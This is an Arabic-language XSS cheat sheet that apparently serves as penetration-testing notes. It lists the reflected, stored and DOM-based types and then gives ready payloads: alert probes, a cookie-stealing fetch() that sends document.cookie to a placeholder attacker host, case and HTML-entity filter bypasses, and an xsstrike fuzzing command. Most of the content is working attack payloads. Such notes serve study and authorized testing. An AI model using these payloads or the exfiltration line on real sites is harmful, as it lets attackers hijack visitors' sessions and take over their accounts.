# Cross-Site Scripting (XSS)

## أنواع
- Reflected: الـ payload بيترجع فورًا في الرد (query param مثلاً)
- Stored: الـ payload بيتخزن (تعليق، بروفايل) ويتنفذ لكل زائر
- DOM-based: التلاعب بيحصل في الـ JS من غير ما يروح للسيرفر

## Payloads أساسية للاختبار
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
```

## سرقة الكوكيز (PoC تعليمي)
```html
<script>fetch('http://<attacker_ip>/c?'+document.cookie)</script>
```

## Bypass شائع لما فيه فلترة
```html
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror="&#97;lert(1)">
```

## أدوات
```bash
xsstrike -u "http://<host>/page?q=FUZZ"
```
